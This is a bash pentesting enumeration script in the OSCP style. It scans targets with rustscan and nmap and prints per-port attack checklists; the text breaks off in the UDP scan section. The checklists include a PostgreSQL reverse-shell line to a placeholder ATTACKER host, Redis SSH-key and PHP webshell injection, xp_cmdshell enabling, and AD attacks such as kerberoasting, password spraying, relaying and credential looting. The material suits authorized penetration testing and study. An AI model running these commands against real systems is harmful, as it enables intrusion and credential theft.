#!/bin/bash

################################################################################
# OSCP Advanced Network Pentesting Enumeration Script v6.0
# Purpose: Deep enumeration of all network services with speed-first approach
# Output: Single consolidated TXT report with clean services summary
# Based on OSCP methodology + AD Attack Mindmap 2025
# v6.0: Rustscan-first port discovery, Checklist mode, nxc-only, concise output
################################################################################

VERSION="6.0"
SCRIPT_START=$(date +%s)

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    clear
    cat << "EOF"
+===========================================================================+
|                                                                           |
|     ██████╗ ███████╗ ██████╗██████╗     ███████╗███╗   ██╗██╗   ██╗       |
|    ██╔═══██╗██╔════╝██╔════╝██╔══██╗    ██╔════╝████╗  ██║██║   ██║       |
|    ██║   ██║███████╗██║     ██████╔╝    █████╗  ██╔██╗ ██║██║   ██║       |
|    ██║   ██║╚════██║██║     ██╔═══╝     ██╔══╝  ██║╚██╗██║██║   ██║       |
|    ╚██████╔╝███████║╚██████╗██║         ███████╗██║ ╚████║╚██████╔╝       |
|     ╚═════╝ ╚══════╝ ╚═════╝╚═╝         ╚══════╝╚═╝  ╚═══╝ ╚═════╝        |
|                                                                           |
|              Advanced Network Pentesting Enumeration v6.0                 |
|          Rustscan + Nmap | Checklist Mode | AD Attack Mindmap             |
|                                                                           |
+===========================================================================+
EOF
    echo ""
}

usage() {
    echo -e "${YELLOW}Usage:${NC} $0 <TARGET> [OPTIONS]"
    echo ""
    echo "TARGET:"
    echo "  Single IP:    192.168.1.10"
    echo "  CIDR Range:   192.168.1.0/24"
    echo "  Hostname:     target.htb"
    echo ""
    echo "OPTIONS:"
    echo "  -q, --quick           Quick scan (skip intensive enumeration)"
    echo "  -f, --full            Full scan including large wordlists (slow)"
    echo "  -c, --checklist       Checklist mode: print manual commands per port, no auto-enum"
    echo "  -o, --output DIR      Custom output directory"
    echo "  -d, --domain DOMAIN   Domain name for DNS/AD enumeration"
    echo "  -u, --username USER   Username for authenticated scans"
    echo "  -p, --password PASS   Password for authenticated scans"
    echo "  -H, --hash HASH       NTLM hash for pass-the-hash"
    echo "  -w, --web             Include extensive web enumeration"
    echo "  -h, --help            Show this help"
    echo ""
    echo "Examples:"
    echo "  sudo $0 192.168.1.10"
    echo "  sudo $0 192.168.1.10 -c                    # Checklist mode"
    echo "  sudo $0 192.168.1.0/24 -q"
    echo "  sudo $0 10.10.10.50 -d domain.htb -u user -p pass"
    echo "  sudo $0 192.168.1.100 -d corp.local -u admin -H aad3b435b51404eeaad3b435b51404ee:hash"
    echo ""
    exit 1
}

log() {
    local level=$1; shift
    local message="$@"
    case $level in
        "INFO")    echo -e "${BLUE}[*]${NC} ${message}" ;;
        "SUCCESS") echo -e "${GREEN}[+]${NC} ${message}" ;;
        "WARNING") echo -e "${YELLOW}[!]${NC} ${message}" ;;
        "ERROR")   echo -e "${RED}[-]${NC} ${message}" ;;
        "CRITICAL")echo -e "${RED}[!!!]${NC} ${message}" ;;
        "SECTION")
            echo ""
            echo -e "${PURPLE}=======================================================================${NC}"
            echo -e "${PURPLE}${message}${NC}"
            echo -e "${PURPLE}=======================================================================${NC}"
            echo ""
            ;;
    esac
}

# Report functions
report_init() {
    cat > "$REPORT" << EOF
################################################################################
#                 OSCP NETWORK PENTESTING ENUMERATION REPORT                   #
#                              VERSION 6.0                                     #
################################################################################

Target: $TARGET
Domain: ${DOMAIN:-N/A}
Scan Date: $(date)
Scan Type: $([ "$QUICK_SCAN" = "true" ] && echo "Quick" || echo "Deep")
Checklist Mode: $([ "$CHECKLIST_MODE" = "true" ] && echo "Yes" || echo "No")
Authenticated: $([ -n "$USERNAME" ] && echo "Yes (User: $USERNAME)" || echo "No")

################################################################################
EOF
}

report() { echo "$@" >> "$REPORT"; }
report_section() {
    echo "" >> "$REPORT"
    echo "################################################################################" >> "$REPORT"
    echo "# $1" >> "$REPORT"
    echo "################################################################################" >> "$REPORT"
    echo "" >> "$REPORT"
}
report_subsection() {
    echo "" >> "$REPORT"
    echo "--- $1 ---" >> "$REPORT"
    echo "" >> "$REPORT"
}

################################################################################
# TOOL CHECKS
################################################################################

check_tools() {
    log "INFO" "Checking tools..."

    local required=("nmap" "nc" "awk" "grep" "sed")
    local missing=0

    for tool in "${required[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            log "ERROR" "Required: $tool not found"
            missing=1
        fi
    done
    [ $missing -eq 1 ] && exit 1

    # Rustscan check
    if command -v rustscan &>/dev/null; then
        HAS_RUSTSCAN=true
        log "SUCCESS" "rustscan found - using speed-first port discovery"
    else
        HAS_RUSTSCAN=false
        log "WARNING" "rustscan not found - falling back to nmap (slower)"
        log "WARNING" "Install: https://github.com/RustScan/RustScan"
    fi

    # nxc check
    if command -v nxc &>/dev/null; then
        CME="nxc"
    else
        CME=""
        log "WARNING" "nxc (netexec) not found - some features limited"
    fi

    [ "$EUID" -ne 0 ] && log "WARNING" "Not root - UDP scans limited. Use: sudo $0 $TARGET"
    log "SUCCESS" "Tool check complete"
}

# Auth helper
get_cme_auth() {
    if [ -n "$HASH" ]; then echo "-H '$HASH'"
    elif [ -n "$PASSWORD" ]; then echo "-p '$PASSWORD'"
    fi
}

################################################################################
# CHECKLIST MODE - Print manual commands based on discovered ports
################################################################################

print_checklist() {
    local ports="$1"
    local target="$2"

    log "SECTION" "CHECKLIST MODE - Manual Commands for $target"
    echo ""
    echo -e "${CYAN}========================================${NC}"
    echo -e "${CYAN} Discovered Ports: $ports${NC}"
    echo -e "${CYAN} Target: $target${NC}"
    echo -e "${CYAN}========================================${NC}"
    echo ""

    report_section "CHECKLIST - Manual Commands"
    report "Target: $target"
    report "Ports: $ports"
    report ""

    IFS=',' read -ra PORT_LIST <<< "$ports"
    for port in "${PORT_LIST[@]}"; do
        port=$(echo "$port" | tr -d ' ')
        case $port in
            21)
                _checklist_ftp "$target" ;;
            22)
                _checklist_ssh "$target" ;;
            25|465|587)
                _checklist_smtp "$target" "$port" ;;
            53)
                _checklist_dns "$target" ;;
            69)
                _checklist_tftp "$target" ;;
            80|443|8080|8443|8000|8888)
                _checklist_http "$target" "$port" ;;
            88)
                _checklist_kerberos "$target" ;;
            110|143|993|995)
                _checklist_mail "$target" "$port" ;;
            111|2049)
                _checklist_nfs "$target" ;;
            139|445)
                _checklist_smb "$target" ;;
            161|162)
                _checklist_snmp "$target" ;;
            389|636|3268|3269)
                _checklist_ldap "$target" ;;
            623)
                _checklist_ipmi "$target" ;;
            873)
                _checklist_rsync "$target" ;;
            1433)
                _checklist_mssql "$target" ;;
            1521)
                _checklist_oracle "$target" ;;
            3306)
                _checklist_mysql "$target" ;;
            3389)
                _checklist_rdp "$target" ;;
            5432)
                _checklist_postgresql "$target" ;;
            5900|5901)
                _checklist_vnc "$target" ;;
            5985|5986)
                _checklist_winrm "$target" ;;
            6379)
                _checklist_redis "$target" ;;
            11211)
                _checklist_memcached "$target" ;;
            27017)
                _checklist_mongodb "$target" ;;
            *)
                echo -e "${YELLOW}[Port $port]${NC} Unknown service - enumerate manually:"
                echo "  nmap -sV -sC -p $port $target"
                report "[Port $port] Unknown - nmap -sV -sC -p $port $target"
                ;;
        esac
        echo ""
        report ""
    done

    # AD-specific checklist if Kerberos/LDAP ports found
    if echo "$ports" | grep -qE "(^|,)(88|389|636)(,|$)"; then
        _checklist_ad "$target"
    fi

    # Post-exploitation reminder
    _checklist_post_exploitation
}

_checklist_ftp() {
    local t=$1
    echo -e "${GREEN}[Port 21 - FTP]${NC}"
    echo "  # Anonymous login"
    echo "  ftp $t  (user: anonymous / pass: anonymous)"
    echo "  # Download all files"
    echo "  wget -r --no-passive ftp://anonymous:anonymous@$t/"
    echo "  # Nmap scripts"
    echo "  nmap --script ftp-anon,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 $t"
    echo "  # Known vulns: vsftpd 2.3.4 backdoor, ProFTPD mod_copy"
    report "[FTP 21] ftp $t (anonymous:anonymous)"
    report "  wget -r ftp://anonymous:anonymous@$t/"
    report "  nmap --script ftp-anon,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 $t"
}

_checklist_ssh() {
    local t=$1
    echo -e "${GREEN}[Port 22 - SSH]${NC}"
    echo "  # Banner grab"
    echo "  nc -nv $t 22"
    echo "  # Auth with key"
    echo "  chmod 600 id_rsa && ssh -i id_rsa user@$t"
    echo "  # Legacy algorithms"
    echo "  ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa user@$t"
    echo "  # Brute force"
    echo "  hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$t"
    echo "  # Key cracking"
    echo "  ssh2john id_rsa > hash && john --wordlist=/usr/share/wordlists/rockyou.txt hash"
    report "[SSH 22] nc -nv $t 22"
    report "  hydra -l user -P rockyou.txt ssh://$t"
}

_checklist_smtp() {
    local t=$1 p=$2
    echo -e "${GREEN}[Port $p - SMTP]${NC}"
    echo "  # User enumeration"
    echo "  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $t"
    echo "  # Nmap"
    echo "  nmap --script smtp-commands,smtp-enum-users,smtp-ntlm-info -p $p $t"
    echo "  # Send email"
    echo "  swaks --to victim@domain --from attacker@domain --server $t --body 'test'"
    report "[SMTP $p] smtp-user-enum -M VRFY -U names.txt -t $t"
}

_checklist_dns() {
    local t=$1
    echo -e "${GREEN}[Port 53 - DNS]${NC}"
    echo "  # Zone transfer"
    echo "  dig axfr @$t ${DOMAIN:-domain.htb}"
    echo "  # Reverse lookup"
    echo "  dig -x $t @$t"
    echo "  # Subdomain brute"
    echo "  gobuster dns -d ${DOMAIN:-domain.htb} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $t:53"
    echo "  # Add to /etc/hosts"
    echo "  echo '$t ${DOMAIN:-domain.htb}' | sudo tee -a /etc/hosts"
    report "[DNS 53] dig axfr @$t ${DOMAIN:-domain.htb}"
}

_checklist_tftp() {
    local t=$1
    echo -e "${GREEN}[Port 69 - TFTP]${NC}"
    echo "  tftp $t"
    echo "  tftp> get /etc/passwd"
    report "[TFTP 69] tftp $t"
}

_checklist_http() {
    local t=$1 p=$2
    local proto="http"
    [ "$p" = "443" ] || [ "$p" = "8443" ] && proto="https"
    echo -e "${GREEN}[Port $p - HTTP/S]${NC}"
    echo "  # Technology detection"
    echo "  whatweb -a 3 ${proto}://$t:$p"
    echo "  # Directory brute"
    echo "  gobuster dir -u ${proto}://$t:$p -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50"
    echo "  feroxbuster -u ${proto}://$t:$p -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html"
    echo "  # Vhost enum"
    echo "  gobuster vhost -u ${proto}://$t:$p -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
    echo "  ffuf -u ${proto}://$t:$p -H 'Host: FUZZ.${DOMAIN:-domain.htb}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1"
    echo "  # Vuln scan"
    echo "  nikto -h ${proto}://$t:$p"
    echo "  nmap --script http-enum,http-vuln* -p $p $t"
    echo "  # WordPress"
    echo "  wpscan --url ${proto}://$t:$p -e vp,vt,u"
    echo "  # Manual: robots.txt, sitemap.xml, .htaccess, page source, SSL cert for hostnames"
    report "[HTTP $p] whatweb -a 3 ${proto}://$t:$p"
    report "  gobuster dir -u ${proto}://$t:$p -w common.txt -x php,txt,html"
    report "  nikto -h ${proto}://$t:$p"
}

_checklist_kerberos() {
    local t=$1
    echo -e "${GREEN}[Port 88 - Kerberos]${NC} (Likely Domain Controller)"
    echo "  # User enumeration"
    echo "  kerbrute userenum -d ${DOMAIN:-domain.htb} --dc $t /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
    echo "  # AS-REP Roasting (no creds needed)"
    echo "  impacket-GetNPUsers ${DOMAIN:-domain.htb}/ -dc-ip $t -usersfile users.txt -format hashcat"
    echo "  # Kerberoasting (needs creds)"
    echo "  impacket-GetUserSPNs ${DOMAIN:-domain.htb}/${USERNAME:-user}:${PASSWORD:-pass} -dc-ip $t -request"
    echo "  # Crack: hashcat -m 18200 asrep.txt rockyou.txt  |  hashcat -m 13100 tgs.txt rockyou.txt"
    report "[Kerberos 88] kerbrute userenum -d ${DOMAIN:-domain.htb} --dc $t users.txt"
    report "  impacket-GetNPUsers ${DOMAIN:-domain.htb}/ -dc-ip $t -usersfile users.txt -format hashcat"
}

_checklist_mail() {
    local t=$1 p=$2
    echo -e "${GREEN}[Port $p - POP3/IMAP]${NC}"
    echo "  nc -nv $t $p"
    echo "  # POP3: USER admin / PASS password / LIST / RETR 1"
    echo "  # IMAP: a1 LOGIN admin password / a2 LIST \"\" \"*\" / a3 SELECT INBOX"
    report "[Mail $p] nc -nv $t $p"
}

_checklist_nfs() {
    local t=$1
    echo -e "${GREEN}[Port 111/2049 - RPC/NFS]${NC}"
    echo "  showmount -e $t"
    echo "  mount -t nfs $t:/share /mnt/nfs -o nolock"
    echo "  # PrivEsc: check no_root_squash -> cp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash"
    echo "  nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 $t"
    report "[NFS 111/2049] showmount -e $t"
}

_checklist_smb() {
    local t=$1
    echo -e "${GREEN}[Port 139/445 - SMB]${NC}"
    echo "  # Anonymous access"
    echo "  smbclient -L //$t -N"
    echo "  smbmap -H $t"
    echo "  # Authenticated"
    echo "  smbclient -L //$t -U '${USERNAME:-user}%${PASSWORD:-pass}'"
    echo "  smbmap -H $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' -R"
    echo "  # Enum4linux"
    echo "  enum4linux-ng -A $t"
    echo "  # RID brute (user enum)"
    echo "  nxc smb $t -u '' -p '' --rid-brute 10000"
    echo "  nxc smb $t -u 'guest' -p '' --rid-brute 10000"
    echo "  # Signing check (relay target?)"
    echo "  nxc smb $t"
    echo "  # Vuln checks"
    echo "  nmap --script smb-vuln* -p 445 $t"
    echo "  # Download all files"
    echo "  smbget -R smb://$t/share -U user%pass"
    report "[SMB 445] smbclient -L //$t -N && smbmap -H $t"
    report "  nxc smb $t -u '' -p '' --rid-brute 10000"
    report "  nmap --script smb-vuln* -p 445 $t"
}

_checklist_snmp() {
    local t=$1
    echo -e "${GREEN}[Port 161 - SNMP (UDP)]${NC}"
    echo "  # Community string brute"
    echo "  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $t"
    echo "  # Walk with public"
    echo "  snmpwalk -c public -v2c $t"
    echo "  # Processes: 1.3.6.1.2.1.25.4.2.1.2  Users: 1.3.6.1.4.1.77.1.2.25"
    echo "  snmpwalk -c public -v2c $t 1.3.6.1.2.1.25.4.2.1.2"
    echo "  snmpwalk -c public -v2c $t 1.3.6.1.4.1.77.1.2.25"
    echo "  snmp-check $t -c public"
    report "[SNMP 161] onesixtyone -c snmp.txt $t"
    report "  snmpwalk -c public -v2c $t"
}

_checklist_ldap() {
    local t=$1
    echo -e "${GREEN}[Port 389/636 - LDAP]${NC}"
    echo "  # Base DN"
    echo "  ldapsearch -x -H ldap://$t -s base namingcontexts"
    echo "  # Anonymous bind"
    echo "  ldapsearch -x -H ldap://$t -b 'DC=${DOMAIN%%.*},DC=${DOMAIN#*.}'"
    echo "  # Users"
    echo "  ldapsearch -x -H ldap://$t -D '${USERNAME:-user}@${DOMAIN:-domain.htb}' -w '${PASSWORD:-pass}' -b 'DC=${DOMAIN%%.*},DC=${DOMAIN#*.}' '(objectClass=user)' sAMAccountName"
    echo "  # Nmap"
    echo "  nmap --script 'ldap* and not brute' -p 389,636 $t"
    echo "  # Domain dump"
    echo "  ldapdomaindump -u '${DOMAIN:-domain}\\${USERNAME:-user}' -p '${PASSWORD:-pass}' $t"
    report "[LDAP 389] ldapsearch -x -H ldap://$t -s base namingcontexts"
}

_checklist_ipmi() {
    local t=$1
    echo -e "${GREEN}[Port 623 - IPMI (UDP)]${NC}"
    echo "  nmap -sU -p 623 --script ipmi-* $t"
    echo "  # Hash dump: use auxiliary/scanner/ipmi/ipmi_dumphashes (Metasploit)"
    echo "  # Cipher 0 bypass: ipmitool -I lanplus -C 0 -H $t -U '' -P '' chassis status"
    report "[IPMI 623] nmap -sU -p 623 --script ipmi-* $t"
}

_checklist_rsync() {
    local t=$1
    echo -e "${GREEN}[Port 873 - Rsync]${NC}"
    echo "  rsync --list-only rsync://$t/"
    echo "  rsync -av rsync://$t/MODULE/ ./downloaded/"
    report "[Rsync 873] rsync --list-only rsync://$t/"
}

_checklist_mssql() {
    local t=$1
    echo -e "${GREEN}[Port 1433 - MSSQL]${NC}"
    echo "  # Connect"
    echo "  impacket-mssqlclient ${DOMAIN:-}/${USERNAME:-sa}:${PASSWORD:-password}@$t -windows-auth"
    echo "  # Enable xp_cmdshell"
    echo "  SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
    echo "  SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
    echo "  SQL> EXEC xp_cmdshell 'whoami';"
    echo "  # Nmap"
    echo "  nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 $t"
    echo "  # nxc"
    echo "  nxc mssql $t -u '${USERNAME:-sa}' -p '${PASSWORD:-pass}' -d '${DOMAIN:-.}'"
    report "[MSSQL 1433] impacket-mssqlclient ${USERNAME:-sa}:pass@$t"
}

_checklist_oracle() {
    local t=$1
    echo -e "${GREEN}[Port 1521 - Oracle]${NC}"
    echo "  odat all -s $t -p 1521"
    echo "  nmap --script oracle-tns-version,oracle-sid-brute -p 1521 $t"
    report "[Oracle 1521] odat all -s $t"
}

_checklist_mysql() {
    local t=$1
    echo -e "${GREEN}[Port 3306 - MySQL]${NC}"
    echo "  mysql -h $t -u root"
    echo "  mysql -h $t -u root -p"
    echo "  # RCE via UDF or INTO OUTFILE"
    echo "  nmap --script mysql-* -p 3306 $t"
    report "[MySQL 3306] mysql -h $t -u root"
}

_checklist_rdp() {
    local t=$1
    echo -e "${GREEN}[Port 3389 - RDP]${NC}"
    echo "  xfreerdp /u:${USERNAME:-user} /p:${PASSWORD:-pass} /v:$t /cert:ignore"
    echo "  xfreerdp /u:administrator /pth:HASH /v:$t"
    echo "  # BlueKeep check"
    echo "  nmap --script rdp-vuln-ms12-020 -p 3389 $t"
    echo "  nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 $t"
    report "[RDP 3389] xfreerdp /u:user /p:pass /v:$t /cert:ignore"
}

_checklist_postgresql() {
    local t=$1
    echo -e "${GREEN}[Port 5432 - PostgreSQL]${NC}"
    echo "  psql -h $t -U postgres -d postgres"
    echo "  # RCE: COPY (SELECT '') TO PROGRAM 'id';"
    echo "  # Reverse shell: COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"';"
    report "[PostgreSQL 5432] psql -h $t -U postgres"
}

_checklist_vnc() {
    local t=$1
    echo -e "${GREEN}[Port 5900 - VNC]${NC}"
    echo "  nmap --script vnc-* -p 5900 $t"
    echo "  vncviewer $t"
    report "[VNC 5900] nmap --script vnc-* -p 5900 $t"
}

_checklist_winrm() {
    local t=$1
    echo -e "${GREEN}[Port 5985/5986 - WinRM]${NC}"
    echo "  evil-winrm -i $t -u ${USERNAME:-user} -p ${PASSWORD:-pass}"
    echo "  evil-winrm -i $t -u ${USERNAME:-user} -H NTLM_HASH"
    echo "  nxc winrm $t -u ${USERNAME:-user} -p ${PASSWORD:-pass}"
    report "[WinRM 5985] evil-winrm -i $t -u user -p pass"
}

_checklist_redis() {
    local t=$1
    echo -e "${GREEN}[Port 6379 - Redis]${NC}"
    echo "  redis-cli -h $t INFO"
    echo "  redis-cli -h $t KEYS '*'"
    echo "  # SSH key injection:"
    echo "  redis-cli -h $t CONFIG SET dir /home/user/.ssh/"
    echo "  redis-cli -h $t CONFIG SET dbfilename 'authorized_keys'"
    echo "  # Webshell:"
    echo "  redis-cli -h $t CONFIG SET dir /var/www/html/"
    echo "  redis-cli -h $t SET test '<?php system(\$_GET[\"cmd\"]); ?>'"
    report "[Redis 6379] redis-cli -h $t INFO"
}

_checklist_memcached() {
    local t=$1
    echo -e "${GREEN}[Port 11211 - Memcached]${NC}"
    echo "  echo 'stats' | nc $t 11211"
    echo "  echo 'stats items' | nc $t 11211"
    report "[Memcached 11211] echo 'stats' | nc $t 11211"
}

_checklist_mongodb() {
    local t=$1
    echo -e "${GREEN}[Port 27017 - MongoDB]${NC}"
    echo "  mongosh --host $t"
    echo "  > show dbs"
    echo "  > use admin; db.system.users.find()"
    report "[MongoDB 27017] mongosh --host $t"
}

_checklist_ad() {
    local t=$1
    echo ""
    echo -e "${PURPLE}=== ACTIVE DIRECTORY ATTACK CHECKLIST ===${NC}"
    echo ""
    echo -e "${CYAN}[1] Enumeration${NC}"
    echo "  nxc smb $t -u '' -p '' --rid-brute 10000"
    echo "  nxc smb $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' --users --pass-pol"
    echo "  bloodhound-python -d ${DOMAIN:-domain.htb} -u ${USERNAME:-user} -p ${PASSWORD:-pass} -ns $t -c All --zip"
    echo ""
    echo -e "${CYAN}[2] AS-REP Roasting${NC}"
    echo "  impacket-GetNPUsers ${DOMAIN:-domain.htb}/ -dc-ip $t -usersfile users.txt -format hashcat"
    echo "  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
    echo ""
    echo -e "${CYAN}[3] Kerberoasting${NC}"
    echo "  impacket-GetUserSPNs ${DOMAIN:-domain.htb}/${USERNAME:-user}:${PASSWORD:-pass} -dc-ip $t -request"
    echo "  hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt"
    echo ""
    echo -e "${CYAN}[4] Password Spray${NC}"
    echo "  # CHECK POLICY FIRST"
    echo "  nxc smb $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' --pass-pol"
    echo "  kerbrute passwordspray -d ${DOMAIN:-domain.htb} --dc $t users.txt 'Summer2024!'"
    echo ""
    echo -e "${CYAN}[5] ADCS${NC}"
    echo "  certipy find -u '${USERNAME:-user}@${DOMAIN:-domain.htb}' -p '${PASSWORD:-pass}' -dc-ip $t"
    echo ""
    echo -e "${CYAN}[6] Delegation${NC}"
    echo "  findDelegation.py ${DOMAIN:-domain.htb}/${USERNAME:-user}:${PASSWORD:-pass} -dc-ip $t"
    echo ""
    echo -e "${CYAN}[7] SMB Relay${NC}"
    echo "  nxc smb $t --gen-relay-list relay_targets.txt"
    echo "  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks"
    echo ""
    echo -e "${CYAN}[8] Coercion${NC}"
    echo "  # PetitPotam (unauthenticated on unpatched)"
    echo "  petitpotam.py LISTENER_IP $t"
    echo "  # Coercer (multi-protocol)"
    echo "  coercer -d ${DOMAIN:-domain.htb} -u ${USERNAME:-user} -p ${PASSWORD:-pass} -t $t -l LISTENER_IP"
    echo ""
    echo -e "${CYAN}[9] Known Vulns${NC}"
    echo "  nxc smb $t -u '' -p '' -M zerologon"
    echo "  nxc smb $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' -M printnightmare"
    echo "  nxc smb $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' -M nopac"
    echo "  nxc smb $t -u '${USERNAME:-user}' -p '${PASSWORD:-pass}' -M petitpotam"
    echo ""

    report ""
    report "=== AD ATTACK CHECKLIST ==="
    report "AS-REP: impacket-GetNPUsers ${DOMAIN:-domain.htb}/ -dc-ip $t -usersfile users.txt -format hashcat"
    report "Kerberoast: impacket-GetUserSPNs ${DOMAIN:-domain.htb}/user:pass -dc-ip $t -request"
    report "ADCS: certipy find -u user@${DOMAIN:-domain.htb} -p pass -dc-ip $t"
    report "BloodHound: bloodhound-python -d ${DOMAIN:-domain.htb} -u user -p pass -ns $t -c All --zip"
    report ""
}

_checklist_post_exploitation() {
    echo ""
    echo -e "${PURPLE}=== POST-EXPLOITATION REMINDERS ===${NC}"
    echo ""
    echo -e "${CYAN}[Linux PrivEsc]${NC}"
    echo "  sudo -l | id | uname -a"
    echo "  find / -perm -4000 -type f 2>/dev/null   # SUID"
    echo "  getcap -r / 2>/dev/null                   # Capabilities"
    echo "  cat /etc/crontab && ls -la /etc/cron.*    # Cron"
    echo "  ./linpeas.sh | ./pspy64"
    echo ""
    echo -e "${CYAN}[Windows PrivEsc]${NC}"
    echo "  whoami /priv | whoami /all | systeminfo"
    echo "  # SeImpersonate -> PrintSpoofer / GodPotato / JuicyPotato"
    echo "  # Check: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    echo "  winpeas.exe | PowerUp.ps1"
    echo ""
    echo -e "${CYAN}[Looting]${NC}"
    echo "  # Windows: mimikatz> sekurlsa::logonpasswords"
    echo "  # Linux: cat /etc/shadow | .bash_history | .ssh/id_rsa"
    echo "  # Config files: wp-config.php, web.config, .env"
    echo ""

    report ""
    report "=== POST-EXPLOITATION REMINDERS ==="
    report "Linux: sudo -l, SUID, caps, cron, linpeas"
    report "Windows: whoami /priv, PrintSpoofer/GodPotato, winpeas"
    report "Looting: mimikatz, shadow, .ssh, config files"
}

################################################################################
# PHASE 1: HOST DISCOVERY
################################################################################

phase_host_discovery() {
    log "SECTION" "Phase 1: Host Discovery"
    report_section "HOST DISCOVERY"

    if echo "$TARGET" | grep -qE '/[0-9]+$'; then
        nmap -sn -T4 $TARGET -oN "$NMAP_DIR/ping_sweep.txt" >/dev/null 2>&1
        [ -f "$NMAP_DIR/ping_sweep.txt" ] && \
            grep "Nmap scan report for" "$NMAP_DIR/ping_sweep.txt" | awk '{print $NF}' | tr -d '()' > "$BASE_DIR/live_hosts.txt"
    else
        if ping -c 2 -W 1 $TARGET >/dev/null 2>&1; then
            echo "$TARGET" > "$BASE_DIR/live_hosts.txt"
            log "SUCCESS" "$TARGET is reachable (ICMP)"
            USE_PN=""
        else
            log "WARNING" "$TARGET does not respond to ping - using -Pn"
            echo "$TARGET" > "$BASE_DIR/live_hosts.txt"
            USE_PN="-Pn"
        fi
    fi

    if [ ! -s "$BASE_DIR/live_hosts.txt" ]; then
        log "ERROR" "No live hosts detected"
        exit 1
    fi

    HOST_COUNT=$(wc -l < "$BASE_DIR/live_hosts.txt")
    log "SUCCESS" "Discovered $HOST_COUNT live host(s)"
    report "Live Hosts: $HOST_COUNT"
}

################################################################################
# PHASE 2: PORT SCANNING (Rustscan-first)
################################################################################

phase_port_scanning() {
    log "SECTION" "Phase 2: Port Scanning (Speed-First)"
    report_section "PORT SCANNING"

    while read host; do
        # --- TCP: Rustscan-first, fallback to nmap ---
        if [ "$HAS_RUSTSCAN" = "true" ] && ! echo "$TARGET" | grep -qE '/[0-9]+$'; then
            log "INFO" "Rustscan: discovering open TCP ports on $host..."
            RUSTSCAN_OUTPUT=$(rustscan -a "$host" --ulimit 5000 -g 2>/dev/null)

            if [ -n "$RUSTSCAN_OUTPUT" ]; then
                # Rustscan -g outputs: ip -> [port1,port2,port3]
                RUSTSCAN_PORTS=$(echo "$RUSTSCAN_OUTPUT" | grep -oE '\[.*\]' | tr -d '[]' | tr ',' '\n' | sort -nu)
                echo "$RUSTSCAN_PORTS" > "$BASE_DIR/tcp_ports.txt"
                TCP_PORTS=$(echo "$RUSTSCAN_PORTS" | tr '\n' ',' | sed 's/,$//')
                TCP_COUNT=$(echo "$RUSTSCAN_PORTS" | wc -l | tr -d ' ')
                log "SUCCESS" "Rustscan found $TCP_COUNT open TCP port(s): $TCP_PORTS"
            else
                log "WARNING" "Rustscan returned no results, falling back to nmap"
                _nmap_tcp_scan "$host"
            fi
        else
            _nmap_tcp_scan "$host"
        fi

        # --- Targeted Nmap: version + scripts on discovered ports ---
        if [ -n "$TCP_PORTS" ]; then
            log "INFO" "Nmap: targeted scan on ports $TCP_PORTS..."
            nmap -sV -sC -O --osscan-guess $USE_PN -p "$TCP_PORTS" \
                --version-intensity 7 "$host" \
                -oN "$NMAP_DIR/service_scan.txt" 2>&1 | tee -a "$BASE_DIR/nmap.log" >/dev/null

            # Extract services
            [ -f "$NMAP_DIR/service_scan.txt" ] && \
                grep "^[0-9]*/tcp.*open" "$NMAP_DIR/service_scan.txt" > "$BASE_DIR/services.txt" 2>/dev/null

            report "Open TCP Ports ($TCP_COUNT): $TCP_PORTS"
            report ""
            if [ -f "$NMAP_DIR/service_scan.txt" ]; then
                OS_INFO=$(grep -E "OS details|Running:" "$NMAP_DIR/service_scan.txt" | head -3)
                [ -n "$OS_INFO" ] && report "OS Detection: $OS_INFO" && report ""

                report "Services:"
                grep "^[0-9]*/tcp.*open" "$NMAP_DIR/service_scan.txt" | while read line; do
                    port=$(echo "$line" | awk '{print $1}')
                    service=$(echo "$line" | awk '{print $3}')
                    version=$(echo "$line" | cut -d' ' -f4- | head -c 60)
                    printf "  %-12s %-15s %s\n" "$port" "$service" "$version" >> "$REPORT"
                done
                report ""
            fi
        else
            log "WARNING" "No open TCP ports found"
        fi

        # --- UDP scan (top ports) ---
        if [ "$QUICK_SCAN" = "true" ]; then UDP_TOP=50; else UDP_TOP=200; fi
        log "INFO" "Nmap: UDP scan (top $UDP_TOP)..."
        nmap -sU $USE_PN --top-ports $UDP_TOP -T4 --open "$host" \
            -oN "$NMAP_DIR/udp_scan.txt" 2>&1 | tee -a "$BASE_DIR/nmap.log" >/dev/null

        if [ -f "$NMAP_DIR/udp_scan.txt" ]; then
            grep "^[0-9]*/udp.*open" "$NMAP_DIR/udp_scan.txt" > "$BASE_DIR/udp_services.txt" 2>/dev/null
